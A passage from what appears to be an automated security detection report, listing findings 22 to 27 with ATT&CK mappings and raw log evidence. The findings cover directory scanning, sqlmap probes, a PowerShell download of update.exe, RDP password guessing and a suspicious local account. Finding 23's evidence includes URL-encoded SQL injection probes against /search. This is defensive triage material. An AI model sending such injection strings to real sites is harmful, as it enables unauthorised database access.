198.51.100.200 - - [10/Nov/2026:07:00:02 +0000] "GET /dev HTTP/1.1" 404 153 "-" "gobuster/3.6"
... 17 more ...
198.51.100.200 - - [10/Nov/2026:07:00:09 +0000] "GET /panel HTTP/1.1" 404 153 "-" "gobuster/3.6"
198.51.100.200 - - [10/Nov/2026:07:00:09 +0000] "GET /manager HTTP/1.1" 404 153 "-" "gobuster/3.6"
198.51.100.200 - - [10/Nov/2026:07:00:09 +0000] "GET /console HTTP/1.1" 404 153 "-" "gobuster/3.6"
198.51.100.200 - - [10/Nov/2026:07:00:10 +0000] "GET /debug HTTP/1.1" 404 153 "-" "gobuster/3.6"
198.51.100.200 - - [10/Nov/2026:07:00:10 +0000] "GET /portal HTTP/1.1" 404 153 "-" "gobuster/3.6"
```

</details>

### 22. [MEDIUM] Vulnerability scanner user agent (WEB-003)

- **Time:** 2026-11-10 07:00:00 to 2026-11-10 07:00:10 UTC (30 events)
- **Source IP:** `198.51.100.200` (external)
- **ATT&CK:** T1595.002 Active Scanning: Vulnerability Scanning

198.51.100.200 sent 30 request(s) identifying as gobuster. If this is not an approved scan, block the source and review what else it requested.

<details><summary>Evidence</summary>

```
198.51.100.200 - - [10/Nov/2026:07:00:00 +0000] "GET /admin HTTP/1.1" 404 153 "-" "gobuster/3.6"
198.51.100.200 - - [10/Nov/2026:07:00:00 +0000] "GET /backup HTTP/1.1" 404 153 "-" "gobuster/3.6"
198.51.100.200 - - [10/Nov/2026:07:00:01 +0000] "GET /old HTTP/1.1" 404 153 "-" "gobuster/3.6"
198.51.100.200 - - [10/Nov/2026:07:00:01 +0000] "GET /test HTTP/1.1" 404 153 "-" "gobuster/3.6"
198.51.100.200 - - [10/Nov/2026:07:00:02 +0000] "GET /dev HTTP/1.1" 404 153 "-" "gobuster/3.6"
... 20 more ...
198.51.100.200 - - [10/Nov/2026:07:00:09 +0000] "GET /manager HTTP/1.1" 404 153 "-" "gobuster/3.6"
198.51.100.200 - - [10/Nov/2026:07:00:09 +0000] "GET /console HTTP/1.1" 404 153 "-" "gobuster/3.6"
198.51.100.200 - - [10/Nov/2026:07:00:10 +0000] "GET /debug HTTP/1.1" 404 153 "-" "gobuster/3.6"
198.51.100.200 - - [10/Nov/2026:07:00:10 +0000] "GET /portal HTTP/1.1" 404 153 "-" "gobuster/3.6"
198.51.100.200 - - [10/Nov/2026:07:00:10 +0000] "GET /files HTTP/1.1" 301 0 "-" "gobuster/3.6"
```

</details>

### 23. [MEDIUM] Vulnerability scanner user agent (WEB-003)

- **Time:** 2026-11-10 09:00:00 to 2026-11-10 09:00:08 UTC (5 events)
- **Source IP:** `203.0.113.150` (external)
- **ATT&CK:** T1595.002 Active Scanning: Vulnerability Scanning

203.0.113.150 sent 5 request(s) identifying as sqlmap. If this is not an approved scan, block the source and review what else it requested.

<details><summary>Evidence</summary>

```
203.0.113.150 - - [10/Nov/2026:09:00:00 +0000] "GET /search?id=1 HTTP/1.1" 200 3100 "-" "sqlmap/1.8.11#stable (https://sqlmap.org)"
203.0.113.150 - - [10/Nov/2026:09:00:02 +0000] "GET /search?id=1%27 HTTP/1.1" 500 3101 "-" "sqlmap/1.8.11#stable (https://sqlmap.org)"
203.0.113.150 - - [10/Nov/2026:09:00:04 +0000] "GET /search?id=1%20AND%201%3D1 HTTP/1.1" 200 3102 "-" "sqlmap/1.8.11#stable (https://sqlmap.org)"
203.0.113.150 - - [10/Nov/2026:09:00:06 +0000] "GET /search?id=1%20AND%201%3D2 HTTP/1.1" 500 3103 "-" "sqlmap/1.8.11#stable (https://sqlmap.org)"
203.0.113.150 - - [10/Nov/2026:09:00:08 +0000] "GET /search?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1" 200 3104 "-" "sqlmap/1.8.11#stable (https://sqlmap.org)"
```

</details>

### 24. [MEDIUM] Script host connected to external address (NET-001)

- **Time:** 2026-11-10 09:14:06 to 2026-11-10 09:14:18 UTC (3 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `thandi`
- **ATT&CK:** T1105 Ingress Tool Transfer, T1071.001 Application Layer Protocol: Web Protocols

powershell.exe on WS-FIN-07.corp.example connected to 198.51.100.23:80 3 time(s). Check the process command line and what was downloaded.

<details><summary>Evidence</summary>

```
{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS-FIN-07.corp.example", "DestinationIp": "198.51.100.23", "DestinationPort": 80, "EventID": 3, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "SourceIp": "10.20.4.17", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:06.000"}
{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS-FIN-07.corp.example", "DestinationIp": "198.51.100.23", "DestinationPort": 80, "EventID": 3, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "SourceIp": "10.20.4.17", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:12.000"}
{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS-FIN-07.corp.example", "DestinationIp": "198.51.100.23", "DestinationPort": 80, "EventID": 3, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "SourceIp": "10.20.4.17", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:18.000"}
```

</details>

### 25. [MEDIUM] Executable or script written by script host (FILE-001)

- **Time:** 2026-11-10 09:14:30 to 2026-11-10 09:14:30 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `thandi`
- **ATT&CK:** T1105 Ingress Tool Transfer, T1204.002 User Execution: Malicious File

powershell.exe wrote C:\Users\thandi\AppData\Local\Temp\update.exe. Hash the file and check whether it was executed.

<details><summary>Evidence</summary>

```
{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS-FIN-07.corp.example", "EventID": 11, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\thandi\\AppData\\Local\\Temp\\update.exe", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:30.000"}
```

</details>

### 26. [MEDIUM] Brute force against account(s) (AUTH-001)

- **Time:** 2026-11-10 09:30:00 to 2026-11-10 09:32:48 UTC (15 events)
- **Host:** `JUMP01.corp.example`
- **User:** `administrator`
- **Source IP:** `203.0.113.199` (external)
- **ATT&CK:** T1110.001 Brute Force: Password Guessing

203.0.113.199 failed 15 logins (at least 10 within 5 min).

<details><summary>Evidence</summary>

```
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:30:00Z"}
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:30:12Z"}
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:30:24Z"}
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:30:36Z"}
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:30:48Z"}
... 5 more ...
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:32:00Z"}
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:32:12Z"}
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:32:24Z"}
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:32:36Z"}
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:32:48Z"}
```

</details>

### 27. [MEDIUM] Local account created (ACCT-001)

- **Time:** 2026-11-10 09:41:00 to 2026-11-10 09:41:00 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `helpdesk2`
- **ATT&CK:** T1136.001 Create Account: Local Account

New account 'helpdesk2' created on WS-FIN-07.corp.example by thandi.

<details><summary>Evidence</summary>

```
{"Computer": "WS-FIN-07.corp.example", "EventID": 4720, "SubjectUserName": "thandi", "TargetUserName": "helpdesk2", "TimeCreated": "2026-11-10T09:41:00Z"}
```

</details>

